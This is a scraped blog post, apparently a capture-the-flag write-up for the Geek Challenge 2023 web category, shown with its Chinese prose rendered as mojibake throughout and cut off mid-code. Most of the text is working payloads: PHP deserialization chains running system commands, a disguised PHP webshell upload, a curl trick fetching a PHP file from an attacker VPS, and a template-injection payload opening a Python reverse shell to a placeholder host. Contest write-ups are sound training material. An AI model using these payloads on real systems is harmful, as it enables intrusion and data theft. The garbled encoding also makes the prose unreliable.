class="toc-text">DEATH_N1TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%90%AC%E9%A3%8E%E4%BA%91"><span class="toc-number">5.8.</span> <span class="toc-text">çªƒå¬é£äº‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractMe"><span class="toc-number">5.9.</span> <span class="toc-text">extractMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E4%BB%A3%E7%9A%84%E7%9C%BC%E6%B3%AA"><span class="toc-number">5.10.</span> <span class="toc-text">æ—¶ä»£çš„çœ¼æ³ª</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleConnect"><span class="toc-number">5.11.</span> <span class="toc-text">SimpleConnect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#give-me-Goerlieth"><span class="toc-number">5.12.</span> <span class="toc-text">give_me_Goerlieth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N2TE"><span class="toc-number">5.13.</span> <span class="toc-text">DEATH_N2TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%90%AC%E9%A3%8E%E4%BA%91-V2"><span class="toc-number">5.14.</span> <span class="toc-text">çªƒå¬é£äº‘-V2</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-Geek-Challenge-2023" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">Geek Challenge 2023</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2023/11/27/match-Geek-Challenge-2023/" class="article-date"><time datetime="2023-11-27T10:28:02.000Z" itemprop="datePublished">2023-11-27</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2023%E8%B5%9B/" rel="tag">2023èµ›</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2023/11/27/match-Geek-Challenge-2023/" class="leancloud_visitors" data-flag-title="Geek Challenge 2023"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/27/match-Geek-Challenge-2023/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>â€‹</p><p>ç¬¬åå››å±Šæå®¢å¤§æŒ‘æˆ˜ GEEK CHALLENGE 2023â€¼ï¸<br>å¼€æ”¾æ³¨å†Œï¼š10æœˆ25æ—¥æ™š10ç‚¹<br>æ¯”èµ›æ—¶é—´ï¼š10æœˆ26æ—¥æ™š8ç‚¹-11æœˆ26æ—¥æ™š8ç‚¹<br>å¹³å°é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://game.sycsec.com/">https://game.sycsec.com/</a><br>èµ›é¢˜èŒƒå›´åŒ…æ‹¬reï¼Œwebï¼Œpwnï¼Œcryptoï¼Œmiscç­‰ç­‰ï¼Œæœ¬å±Šèµ›é¢˜è¿˜åŠ å…¥å…¨æ–°yakè¯­è¨€å…ƒç´ ï¼Œæ–¹å‘å¤šæ ·ï¼Œè¶£å‘³æ€§é«˜ã€‚<br>æœ¬å±Šæ›´å¢æ·»æ ¡å¤–æ’è¡Œæ¦œï¼Œæ ¡å¤–çš„åŒå­¦ä»¬ç»„é˜Ÿå‚ä¸ä¹Ÿèƒ½è·å¾—åæ¬¡å¥–åŠ±ï¼Œæ¬¢è¿å¤§å®¶å‰æ¥æŒ‘æˆ˜ ğŸ’ªã€‚</p><p><strong>Rank: 3</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><blockquote><p>httpç­¾åˆ°ï¼Œç‚¹å‡»å°±é€flag <a target="_blank" rel="noopener" href="http://1.117.175.65:23333/">http://1.117.175.65:23333/</a></p></blockquote><p><code>robots.txt</code> è·å–è´¦å·å¯†ç ï¼Œå†æŒ‰æ­¥éª¤ç”¨å‡ ä¸ªè¯·æ±‚å¤´å­—æ®µç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.117.175.65:23333</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: sycsec.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">via: Syc.vip</span><br><span class="line">O2TAKUXX: GiveMeFlag</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=@dm1N123456r00t#</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h3><blockquote><p>æ¥ç­¾ä¸ªåˆ°å§å…ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ï¼š</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">web</span>:</span><br><span class="line">    public_eva1=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_interesting=<span class="string">&#x27;cat /f*&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_yxx=web()</span><br><span class="line">    public_QW=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">syc</span>:</span><br><span class="line">    public_cuit=lover()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(syc()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POSTï¼š</p><p><code>url=O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</code></p><p>â€‹</p><h3 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h3><p>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼šMIMEã€å›¾ç‰‡å¤´ã€ç»•å…³é”®å­—</p><p>æ„é€ è¯·æ±‚å¤´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a&lt;?=system($_GET[x]);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—® <code>uploadtest/378845_653a63ea1370a.php?x=cat /flag</code> æ‹¿flagã€‚</p><p>â€‹</p><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><blockquote><p>å­¦äº†phpäº†ï¼Œé‚£å°±æ¥çœ‹çœ‹è¿™äº›ç»•è¿‡å§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>] !== <span class="string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>]) &lt; <span class="number">2023</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>] + <span class="number">1</span>) &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$array1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>];</span><br><span class="line">            <span class="variable">$array2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$array1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$array2</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="string">&quot;Happy to see you!&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;å†ç»•æœ€åä¸€æ­¥å§&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å¥½å“©ï¼Œå¿«æ‹¿åˆ°flagå•¦&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿™é‡Œç»•ä¸è¿‡å»ï¼ŒQWå¯ä¸ç­”åº”äº†å“ˆ&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å˜¿å˜¿å˜¿ï¼Œä½ åˆ«æ€¥å•Š&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸ä¼šå§ä¸ä¼šå§ï¼Œä¸ä¼šç¬¬ä¸€æ­¥å°±å¡ä½äº†å§ï¼Œyxxä¼šç§ä¸èµ·ä½ çš„ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç¬¬1å±‚ï¼šæ¢è¡Œç¬¦ç»•è¿‡ï¼›</p><p>ç¬¬2å±‚ï¼šç§‘å­¦è®¡æ•°æ³•ç»• <code>intval()</code>ï¼›</p><p>ç¬¬3å±‚ï¼šsha1ç¢°æ’ï¼›</p><p>ç¬¬4å±‚ï¼šPHPè§£æç‰¹æ€§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?syc=Welcome%20to%20GEEK%202023!%0a&amp;lover=2e5 HTTP/1.1</span><br><span class="line">Host: h2y55ia9rcbaswjlhegv0qonf.node.game.sycsec.com</span><br><span class="line">Content-Length: 1320</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">qw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;SYC[GEEK.2023=Happy to see you!</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h3><blockquote><p>å‘½ä»¤æ‰§è¡Œï¼ŸçœŸçš„å—ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// curl your domain</span></span><br><span class="line"><span class="comment">// flag is in /tmp/Syclover</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|f|:|\||\&amp;|!|&gt;|&lt;|`|\(|&#123;|\?|\n|\r/i&quot;</span>, <span class="variable">$address</span>))&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&gt; /dev/null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>åˆ©ç”¨VPSå’Œcurlå†™æ–‡ä»¶çš„å‚æ•°ï¼š</p><p><code>?addr=-O%201.php%20x.x.x.x/1.txt</code></p><p>å…¶ä¸­ <code>1.txt</code> å†…å®¹ä¸ºï¼š<code>&lt;?php system(&quot;cat /tmp/Syclover&quot;);?&gt;</code></p><p>è®¿é—® <code>1.php</code> å¾—flagã€‚</p><p>â€‹</p><h3 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h3><blockquote><p>De1tyçš„å¹¿ä¸œæœ‹å‹è·Ÿå¥³ç¥è¡¨ç™½è¢«éª‚klfï¼Œç°åœ¨æ°”æ€¥è´¥åï¼Œä½ çŸ¥é“klfæ˜¯ä»€ä¹ˆæ„æ€å˜›ï¼Ÿä»–ç°åœ¨ä¾æ—§è§‰å¾—ä»–ä¸æ˜¯klfä½ ä»¬æ‰æ˜¯ï¼Œä½ èƒ½æ‹¿åˆ°flagè¯æ˜ä»–æ˜¯klfå˜›â€¦</p></blockquote><p>è·¯ç”±ï¼š<code>/hack?klf=xxx</code></p><p>æ— è¿‡æ»¤ï¼Œä½†ä¹Ÿæ— è¾“å‡ºçš„SSTIç›²æ‰“ï¼Œåˆ©ç”¨pythonåå¼¹shellåˆ°VPSï¼š</p><p><code>/hack?klf=&#123;%print(config.__class__.__init__.__globals__['os'].popen('python3 -c \'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("x.x.x.x",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\' ').read())%&#125;</code></p><p>åœ¨æ ¹ç›®å½•æ‹¿åˆ°flagã€‚</p><p>â€‹</p><h3 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h3><blockquote><p>æˆ‘æƒ³è¦å›ç‚‰é‡é€ ä¸€æ³¢ï¼Œæ€ä¹ˆè¯´ï¼Œéš¾é“ä½ ä¸æƒ³å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;å¿«æ¥ç©å¿«æ¥ç©~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ååºåˆ—åŒ–ï¼Œç”¨ <code>S</code> ç»•å…³é”®å­—è¿‡æ»¤ï¼Œå»æœ€åå¤§æ‹¬å·ç»• <code>Exception</code>ã€‚</p><p>å‘ç°è¯»ä¸å‡ºæ ¹ç›®å½•flagå€¼ï¼Œå­˜åœ¨open_basedirï¼Œåˆ©ç”¨ç»•è¿‡å‘½ä»¤è¯»ï¼š</p><p><code>/?web=O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\6cover&quot;;s:142:&quot;mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readgzfile(&#39;/f1ger&#39;);&quot;;</code></p><p>â€‹</p><h3 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h3><blockquote><p>å¿«æ¥joinæˆ‘çš„åšå®¢å§ï¼</p></blockquote><p>æºç æ³¨é‡Šï¼š<code>&lt;!--secretåœ¨æ ¹ç›®å½•f14444æ–‡ä»¶é‡Œé¢ï¼Œåˆ«å¿˜è®°äº†--&gt;</code>ã€‚</p><p>é¦–é¡µå¾—åˆ°æ³„éœ²çš„æ–‡ä»¶ <code>app.cpython-39.pyc</code>ï¼Œåç¼–è¯‘å¾—pythonæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">ARTICLES_FOLDER = <span class="string">&#x27;articles/&#x27;</span></span><br><span class="line">articles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, article_id, title, 